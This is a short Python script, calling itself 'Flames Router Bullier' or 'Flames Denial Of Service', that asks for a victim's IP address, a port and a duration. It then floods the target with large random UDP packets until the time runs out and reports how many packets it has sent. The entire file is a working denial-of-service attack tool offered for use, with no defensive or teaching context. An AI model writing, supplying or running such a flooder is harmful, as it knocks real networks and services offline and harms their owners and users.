import time
import socket
import random
import sys
import os

def usage():
    
    print("[------------------------[Flames Router Bullier]---------------------]")
    print("|                                                                    |")
    print("[____________________________________________________________________]")

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(29009)  # Secure random data
    timeout = time.time() + duration
    sent = 0

    print(f"Flooding {victim} on port {vport} for {duration} seconds...")
    while time.time() < timeout:
        client.sendto(bytes, (victim, vport))
        sent += 1
        if sent % 1000 == 0:
            print(f"\033[1;91mSent \033[1;32m{sent} \033[1;91mPackets to host \033[1;32m{victim} \033[1;91mTo Port \033[1;32m{vport}")
    print("\033[1;92mFlooding completed successfully.")

def get_input():
    print("Flames Denial Of Service, Please enter the following details:")
    victim = input("Enter the victim's IP address: ")
    vport = input("Enter the port number (e.g., 80 for http, 53 for DNS, 443 for https): ")
    duration = input("Enter the attack duration in seconds: ")

    try:
        vport = int(vport)
        duration = int(duration)
    except ValueError:
        print("Error: Port and duration must be valid integers.")
        sys.exit(1)

    return victim, vport, duration

def main():
    usage()
    victim, vport, duration = get_input()
    flood(victim, vport, duration)

if __name__ == '__main__':
    main()
